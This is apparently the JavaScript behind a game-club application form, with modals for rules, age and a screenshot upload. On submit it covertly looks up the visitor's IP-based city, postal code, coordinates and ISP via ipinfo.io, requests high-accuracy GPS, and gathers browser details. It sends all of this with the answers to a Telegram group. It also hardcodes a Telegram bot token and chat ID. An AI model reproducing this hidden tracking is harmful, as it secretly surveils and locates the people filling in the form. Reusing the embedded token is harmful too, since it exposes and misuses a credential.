// --- Show "What club?" if "Yes" is selected ---
const inClubSelect = document.getElementById("inClub");
const clubNameContainer = document.getElementById("clubNameContainer");
const clubNameInput = document.getElementById("clubName");

inClubSelect.addEventListener("change", () => {
  if (inClubSelect.value === "Yes") {
    clubNameContainer.style.display = "block";
    clubNameInput.setAttribute("required", "required");
  } else {
    clubNameContainer.style.display = "none";
    clubNameInput.removeAttribute("required");
  }
});

// --- Elements ---
const screenshotInput = document.getElementById("screenshot");
const previewImage = document.getElementById("previewImage");
const clubForm = document.getElementById("clubForm");
const rulesCheckbox = document.getElementById("rulesCheckbox");
const submitButton = document.getElementById("submitButton");

// --- Rules Modal Elements ---
const readRulesLink = document.getElementById("readRulesLink");
const rulesModal = document.getElementById("rulesModal");
const agreeButton = document.getElementById("agreeButton");
const declineButton = document.getElementById("declineButton");

// --- Photo Warning Modal Elements ---
const photoModal = document.getElementById("photoModal");
const photoBackBtn = document.getElementById("photoBackBtn");
const photoOkBtn = document.getElementById("photoOkBtn");

let proceedWithoutPhoto = false;

// --- Age Modal Elements ---
const ageInput = document.getElementById("age");
const ageModal = document.getElementById("ageModal");
const ageAgreeBtn = document.getElementById("ageAgreeButton");
const ageDeclineBtn = document.getElementById("ageDeclineButton");

// --- Age Confirmation Modal Logic ---
ageInput.addEventListener("change", () => {
  const age = parseInt(ageInput.value);
  if (!isNaN(age) && age >= 40) {
    ageModal.style.display = "flex";
    document.body.style.overflow = "hidden";
  }
});

function closeAgeModal() {
  ageModal.style.display = "none";
  document.body.style.overflow = "";
}

ageAgreeBtn.addEventListener("click", closeAgeModal);
ageDeclineBtn.addEventListener("click", () => {
  ageInput.value = "";
  closeAgeModal();
});

// --- Handle Image Preview ---
screenshotInput.addEventListener("change", function () {
  const file = this.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = function (e) {
      previewImage.src = e.target.result;
      previewImage.style.display = "block";
    };
    reader.readAsDataURL(file);
  } else {
    previewImage.src = "";
    previewImage.style.display = "none";
  }
});

// --- Handle Rules Modal ---
readRulesLink.addEventListener("click", () => {
  rulesModal.style.display = "flex";
  document.body.style.overflow = "hidden";
});

agreeButton.addEventListener("click", () => {
  rulesModal.style.display = "none";
  document.body.style.overflow = "";
  rulesCheckbox.disabled = false;
  rulesCheckbox.checked = true;
  submitButton.style.display = "inline-block";
});

declineButton.addEventListener("click", () => {
  window.location.href = "bye folder/goodbye.html";
});

// --- Handle Photo Warning Modal ---
photoBackBtn.addEventListener("click", () => {
  photoModal.style.display = "none";
  document.body.style.overflow = "";
});

photoOkBtn.addEventListener("click", () => {
  proceedWithoutPhoto = true;
  photoModal.style.display = "none";
  document.body.style.overflow = "";
  clubForm.dispatchEvent(new Event("submit"));
});

// --- Form Submission Logic ---
clubForm.addEventListener("submit", async function (e) {
  e.preventDefault();

  if (!rulesCheckbox.checked) {
    alert("Please read and agree to the rules first.");
    return;
  }

  const screenshotFile = screenshotInput.files[0];
  if (!screenshotFile && !proceedWithoutPhoto) {
    photoModal.style.display = "flex";
    document.body.style.overflow = "hidden";
    return;
  }

// --- Gather Form Data ---
const name = document.getElementById("name").value;
const age = document.getElementById("age").value;
const gameId = document.getElementById("gameId").value;
const ign = document.getElementById("ign").value;
const reason = document.getElementById("reason").value;
const contact = document.getElementById("contact").value;
const drivetrain = Array.from(document.querySelectorAll("input[name='drivetrain']:checked"))
  .map(el => el.value)
  .join(", ");
const inClub = document.getElementById("inClub").value;
const clubName = document.getElementById("clubName").value || "N/A";

const userAgent = navigator.userAgent;
const time = new Date().toLocaleString();
const platform = navigator.platform || "Unknown";

const browser = (() => {
  const ua = navigator.userAgent;
  if (ua.includes("Firefox")) return "Firefox 🦊";
  if (ua.includes("Edg")) return "Edge 🔵";
  if (ua.includes("Chrome")) return "Chrome 🌈";
  if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari 🍏";
  if (ua.includes("Opera") || ua.includes("OPR")) return "Opera 🎭";
  return "Unknown 🌐";
})();

// --- Get IP Location Info ---
const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
const ip = ipData.ip || "Unknown";
const city = ipData.city || "Unknown";
const region = ipData.region || "Unknown";
const country = ipData.country || "Unknown";
const loc = ipData.loc || "N/A"; // e.g. "14.5995,120.9842"
const org = ipData.org || "Unknown";
const postal = ipData.postal || "Unknown";
const timezone = ipData.timezone || "Unknown";
const version = ip.includes(":") ? "IPv6 🌐" : "IPv4 🌐";
const [ipLat, ipLon] = loc.split(',');

// --- Get Device GPS Location (if allowed) ---
function getDeviceLocation() {
  return new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(
      pos => {
        resolve({
          latitude: pos.coords.latitude.toFixed(6),
          longitude: pos.coords.longitude.toFixed(6),
          accuracy: pos.coords.accuracy + "m",
          timestamp: new Date(pos.timestamp).toLocaleString()
        });
      },
      err => {
        resolve({
          latitude: "Permission denied ❌",
          longitude: "Permission denied ❌",
          accuracy: "N/A",
          timestamp: "N/A"
        });
      },
      { enableHighAccuracy: true }
    );
  });
}

const deviceLoc = await getDeviceLocation();

// --- Final Message ---
const message = ` 
**New Form Submission 😁**

┏━━━━━━━━━━━━━━━━━━┓
 👤 Name: ${name}
 🎂 Age: ${age}
 🎮 Game ID: ${gameId}
 🆔 In-Game Name: ${ign}
 🚗 Drivetrain: ${drivetrain}
 📝 Reason: ${reason}
 ❓ In Club?: ${inClub}
 🏷️ Club Name: ${clubName}
 📧 Contact: ${contact}
┗━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━┓
**📍 IP-Based Location**
 🌐 IP Address: ${ip} (${version})
 🏙️ City: ${city}
 🗺️ Region: ${region}
 🌎 Country: ${country}
 🏤 Postal Code: ${postal}
 📌 Latitude: ${ipLat}
 📌 Longitude: ${ipLon}
 🧭 Timezone: ${timezone}
 🛰️ Internet Provider: ${org}
┗━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━┓
**📍 Device-Based GPS Location**
 📌 Latitude: ${deviceLoc.latitude}
 📌 Longitude: ${deviceLoc.longitude}
 🎯 Accuracy: ${deviceLoc.accuracy}
 🕒 Timestamp: ${deviceLoc.timestamp}
┗━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━┓
 **💻 Device Info**
 🧠 Browser: ${browser}
 🖥️ OS: ${platform}
 📆 Time: ${time}
 🔍 User Agent: ${userAgent}
┗━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━┓
 ⚠️ Information is confidential and shall not be shared outside this group ⚠️
┗━━━━━━━━━━━━━━━━━━━┛
`;

  const botToken = "7667330008:AAHUx9qjLLGVjr-5_LPSVvabFFt63cPYkCA";
  const chatId = "-1002509362547";

  if (screenshotFile) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("caption", message);
    formData.append("photo", screenshotFile);

    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      body: formData
    });
  } else {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      })
    });
  }

  window.location.href = "success folder/success.html";
});